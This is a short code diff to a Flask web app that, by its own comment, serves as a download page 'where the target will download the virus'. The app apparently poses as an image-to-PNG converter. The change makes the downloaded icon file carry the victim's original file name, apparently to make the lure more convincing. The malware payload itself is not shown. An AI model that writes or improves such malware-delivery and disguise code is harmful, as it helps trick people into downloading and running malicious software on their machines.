@@ -193,7 +193,7 @@ def proceed():
     # os.remove(upload_path)
 
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}')
+    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=original_filename)
 
 # Download page where the target will download the virus
 @app.route("/results", methods=['GET', 'POST'])
@@ -335,9 +335,9 @@ def download_file(filename):
     return ""
 
 # Download desktop file icon
-@app.route('/icon/<path:filename>', methods=['GET', 'POST'])
-def download_icon(filename):
-    return send_from_directory(PNG_FOLDER, f'{filename}.png', download_name=f'{session['filename']}.png', as_attachment=True)
+@app.route('/icon/<path:filename>/<path:download_name>', methods=['GET', 'POST'])
+def download_icon(filename, download_name):
+    return send_from_directory(PNG_FOLDER, f'{filename}.png', download_name=download_name, as_attachment=True)
 
 if __name__ == "__main__":
     create_db()
